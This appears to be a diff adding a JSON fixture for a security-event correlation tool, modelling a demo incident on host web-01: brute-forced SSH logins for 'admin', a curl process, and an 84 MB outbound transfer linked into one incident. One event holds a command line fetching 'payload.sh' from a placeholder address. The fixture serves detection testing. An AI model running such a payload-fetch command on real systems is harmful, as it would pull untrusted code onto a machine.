@@ -1,0 +1,361 @@
+{
+  "events": [
+    {
+      "id": "evt-001",
+      "timestamp": "2026-09-16T12:01:00Z",
+      "source": "auth",
+      "event_type": "login_failure",
+      "user": "admin",
+      "src_ip": "10.2.4.18",
+      "dst_ip": null,
+      "host": "web-01",
+      "process": null,
+      "bytes_out": null,
+      "severity": 2,
+      "raw": "Failed SSH login for admin from 10.2.4.18",
+      "metadata": {
+        "parser": "auth"
+      }
+    },
+    {
+      "id": "evt-002",
+      "timestamp": "2026-09-16T12:01:08Z",
+      "source": "auth",
+      "event_type": "login_failure",
+      "user": "admin",
+      "src_ip": "10.2.4.18",
+      "dst_ip": null,
+      "host": "web-01",
+      "process": null,
+      "bytes_out": null,
+      "severity": 2,
+      "raw": "Failed SSH login for admin from 10.2.4.18",
+      "metadata": {
+        "parser": "auth"
+      }
+    },
+    {
+      "id": "evt-003",
+      "timestamp": "2026-09-16T12:01:16Z",
+      "source": "auth",
+      "event_type": "login_failure",
+      "user": "admin",
+      "src_ip": "10.2.4.18",
+      "dst_ip": null,
+      "host": "web-01",
+      "process": null,
+      "bytes_out": null,
+      "severity": 2,
+      "raw": "Failed SSH login for admin from 10.2.4.18",
+      "metadata": {
+        "parser": "auth"
+      }
+    },
+    {
+      "id": "evt-004",
+      "timestamp": "2026-09-16T12:01:24Z",
+      "source": "auth",
+      "event_type": "login_failure",
+      "user": "admin",
+      "src_ip": "10.2.4.18",
+      "dst_ip": null,
+      "host": "web-01",
+      "process": null,
+      "bytes_out": null,
+      "severity": 2,
+      "raw": "Failed SSH login for admin from 10.2.4.18",
+      "metadata": {
+        "parser": "auth"
+      }
+    },
+    {
+      "id": "evt-005",
+      "timestamp": "2026-09-16T12:01:32Z",
+      "source": "auth",
+      "event_type": "login_failure",
+      "user": "admin",
+      "src_ip": "10.2.4.18",
+      "dst_ip": null,
+      "host": "web-01",
+      "process": null,
+      "bytes_out": null,
+      "severity": 2,
+      "raw": "Failed SSH login for admin from 10.2.4.18",
+      "metadata": {
+        "parser": "auth"
+      }
+    },
+    {
+      "id": "evt-006",
+      "timestamp": "2026-09-16T12:03:00Z",
+      "source": "auth",
+      "event_type": "login_success",
+      "user": "admin",
+      "src_ip": "10.2.4.18",
+      "dst_ip": null,
+      "host": "web-01",
+      "process": null,
+      "bytes_out": null,
+      "severity": 1,
+      "raw": "Successful SSH login for admin from 10.2.4.18",
+      "metadata": {
+        "parser": "auth"
+      }
+    },
+    {
+      "id": "evt-007",
+      "timestamp": "2026-09-16T12:04:00Z",
+      "source": "process",
+      "event_type": "process_start",
+      "user": "admin",
+      "src_ip": null,
+      "dst_ip": null,
+      "host": "web-01",
+      "process": "curl",
+      "bytes_out": null,
+      "severity": 2,
+      "raw": "New process curl on web-01",
+      "metadata": {
+        "parser": "process",
+        "command_line": "curl -fsSL https://198.51.100.24/payload.sh"
+      }
+    },
+    {
+      "id": "evt-008",
+      "timestamp": "2026-09-16T12:07:00Z",
+      "source": "network",
+      "event_type": "network_transfer",
+      "user": null,
+      "src_ip": "10.0.0.5",
+      "dst_ip": "198.51.100.24",
+      "host": "web-01",
+      "process": null,
+      "bytes_out": 88080384,
+      "severity": 2,
+      "raw": "84 MB outbound transfer from web-01",
+      "metadata": {
+        "parser": "network",
+        "demo_destination": true
+      }
+    }
+  ],
+  "incidents": [
+    {
+      "id": "INC-001",
+      "title": "Potential credential compromise on web-01",
+      "severity": "HIGH",
+      "score": 5,
+      "entities": {
+        "source_ips": [
+          "10.2.4.18"
+        ],
+        "users": [
+          "admin"
+        ],
+        "hosts": [
+          "web-01"
+        ],
+        "processes": [
+          "curl"
+        ],
+        "destination_ips": [
+          "198.51.100.24"
+        ]
+      },
+      "stages": [
+        "brute_force",
+        "account_compromise",
+        "suspicious_execution",
+        "possible_exfiltration"
+      ],
+      "event_ids": [
+        "evt-001",
+        "evt-002",
+        "evt-003",
+        "evt-004",
+        "evt-005",
+        "evt-006",
+        "evt-007",
+        "evt-008"
+      ]
+    }
+  ],
+  "relationships": [
+    {
+      "id": "rel-INC-001-001",
+      "source": "ip:10.2.4.18",
+      "target": "user:admin",
+      "relationship_type": "authenticated_as",
+      "reason": "Repeated authentication attempts targeted the same account.",
+      "event_ids": [
+        "evt-001",
+        "evt-002",
+        "evt-003",
+        "evt-004",
+        "evt-005",
+        "evt-006"
+      ]
+    },
+    {
+      "id": "rel-INC-001-002",
+      "source": "user:admin",
+      "target": "host:web-01",
+      "relationship_type": "authenticated_on",
+      "reason": "The successful post-brute-force login established the compromised host.",
+      "event_ids": [
+        "evt-006"
+      ]
+    },
+    {
+      "id": "rel-INC-001-003",
+      "source": "process:curl",
+      "target": "host:web-01",
+      "relationship_type": "executed_on",
+      "reason": "A controlled-demo suspicious process followed the compromised login.",
+      "event_ids": [
+        "evt-007"
+      ]
+    },
+    {
+      "id": "rel-INC-001-004",
+      "source": "host:web-01",
+      "target": "ip:198.51.100.24",
+      "relationship_type": "connected_to",
+      "reason": "The compromised host sent a large transfer or contacted a marked destination.",
+      "event_ids": [
+        "evt-008"
+      ]
+    },
+    {
+      "id": "rel-INC-001-005",
+      "source": "stage:INC-001:brute_force",
+      "target": "stage:INC-001:account_compromise",
+      "relationship_type": "preceded_by",
+      "reason": "brute_force occurred before account_compromise for correlated entities.",
+      "event_ids": [
+        "evt-001",
+        "evt-002",
+        "evt-003",
+        "evt-004",
+        "evt-005",
+        "evt-006",
+        "evt-007",
+        "evt-008"
+      ]
+    },
+    {
+      "id": "rel-INC-001-006",
+      "source": "stage:INC-001:account_compromise",
+      "target": "stage:INC-001:suspicious_execution",
+      "relationship_type": "preceded_by",
+      "reason": "account_compromise occurred before suspicious_execution for correlated entities.",
+      "event_ids": [
+        "evt-001",
+        "evt-002",
+        "evt-003",
+        "evt-004",
+        "evt-005",
+        "evt-006",
+        "evt-007",
+        "evt-008"
+      ]
+    },
+    {
+      "id": "rel-INC-001-007",
+      "source": "stage:INC-001:suspicious_execution",
+      "target": "stage:INC-001:possible_exfiltration",
+      "relationship_type": "preceded_by",
+      "reason": "suspicious_execution occurred before possible_exfiltration for correlated entities.",
+      "event_ids": [
+        "evt-001",
+        "evt-002",
+        "evt-003",
+        "evt-004",
+        "evt-005",
+        "evt-006",
+        "evt-007",
+        "evt-008"
+      ]
+    },
+    {
+      "id": "rel-INC-001-008",
+      "source": "event:evt-001",
+      "target": "incident:INC-001",
+      "relationship_type": "correlated_with",
+      "reason": "This event is evidence for the incident's deterministic rule chain.",
+      "event_ids": [
+        "evt-001"
+      ]
+    },
+    {
+      "id": "rel-INC-001-009",
+      "source": "event:evt-002",
+      "target": "incident:INC-001",
+      "relationship_type": "correlated_with",
+      "reason": "This event is evidence for the incident's deterministic rule chain.",
+      "event_ids": [
+        "evt-002"
+      ]
+    },
+    {
+      "id": "rel-INC-001-010",
+      "source": "event:evt-003",
+      "target": "incident:INC-001",
+      "relationship_type": "correlated_with",
+      "reason": "This event is evidence for the incident's deterministic rule chain.",
+      "event_ids": [
+        "evt-003"
+      ]
+    },
+    {
+      "id": "rel-INC-001-011",
+      "source": "event:evt-004",
+      "target": "incident:INC-001",
+      "relationship_type": "correlated_with",
+      "reason": "This event is evidence for the incident's deterministic rule chain.",
+      "event_ids": [
+        "evt-004"
+      ]
+    },
+    {
+      "id": "rel-INC-001-012",
+      "source": "event:evt-005",
+      "target": "incident:INC-001",
+      "relationship_type": "correlated_with",
+      "reason": "This event is evidence for the incident's deterministic rule chain.",
+      "event_ids": [
+        "evt-005"
+      ]
+    },
+    {
+      "id": "rel-INC-001-013",
+      "source": "event:evt-006",
+      "target": "incident:INC-001",
+      "relationship_type": "correlated_with",
+      "reason": "This event is evidence for the incident's deterministic rule chain.",
+      "event_ids": [
+        "evt-006"
+      ]
+    },
+    {
+      "id": "rel-INC-001-014",
+      "source": "event:evt-007",
+      "target": "incident:INC-001",
+      "relationship_type": "correlated_with",
+      "reason": "This event is evidence for the incident's deterministic rule chain.",
+      "event_ids": [
+        "evt-007"
+      ]
+    },
+    {
+      "id": "rel-INC-001-015",
+      "source": "event:evt-008",
+      "target": "incident:INC-001",
+      "relationship_type": "correlated_with",
+      "reason": "This event is evidence for the incident's deterministic rule chain.",
+      "event_ids": [
+        "evt-008"
+      ]
+    }
+  ]
+}
